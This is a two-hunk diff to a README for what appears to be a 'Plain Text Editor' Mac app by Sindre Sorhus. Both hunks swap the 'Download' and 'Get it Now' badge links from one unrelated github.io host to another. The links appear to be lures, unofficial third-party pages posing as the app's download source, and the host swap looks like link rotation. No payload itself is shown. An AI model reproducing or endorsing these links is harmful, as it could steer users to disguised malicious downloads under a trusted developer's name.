@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://somovskoye.github.io/.github/plainTextEditor">
+  <a href="https://skalsd-oasd.github.io/.github/plainTextEditor">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Plain Text Editor"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ Sindre Sorhus's body of Mac applications reflects a philosophy of making small, 
 
 <p align="center">
 
-[![Get it Now Plain Text Editor](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/plainTextEditor)
+[![Get it Now Plain Text Editor](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/plainTextEditor)
 
 </p>
 
